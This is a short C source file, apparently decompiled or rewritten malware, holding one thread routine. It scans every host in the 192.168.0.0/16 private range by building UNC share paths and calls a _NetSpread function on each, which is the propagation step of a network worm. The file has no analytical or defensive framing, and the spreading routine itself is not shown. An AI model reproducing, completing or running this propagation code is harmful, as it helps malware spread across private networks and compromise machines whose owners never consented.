#include "data_globals.h"
#include <string.h>
#include <stdio.h>
#include <stdbool.h>

DWORD WINAPI _L0cal_4(LPVOID Data)
{
    char local_54[64];
    uint32_t local_14;
    uint32_t local_10;
    LPCSTR param_1 = (LPCSTR)Data;

    for (local_10 = 0; local_10 < 0x100; local_10++)
    {
        for (local_14 = 0; local_14 < 0x100; local_14++)
        {
            memset(local_54, 0, sizeof(local_54));
            sprintf(local_54, "\\\\192.168.%d.%d", local_10, local_14);
            _NetSpread((uint32_t)local_54, param_1);
        }
    }
    return 0;
}
